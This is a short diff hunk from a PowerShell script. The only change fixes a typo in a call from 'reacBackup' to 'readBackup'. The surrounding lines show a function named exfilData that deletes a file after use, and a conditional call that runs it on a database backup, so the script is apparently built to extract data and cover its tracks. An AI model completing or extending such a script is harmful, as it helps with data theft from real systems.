@@ -41,4 +41,4 @@ function exfilData {
     Remove-Item $FileName
     }
 if (-not ([string]::IsNullOrEmpty($db))){exfilData -f $FileName}
-reacBackup
+readBackup
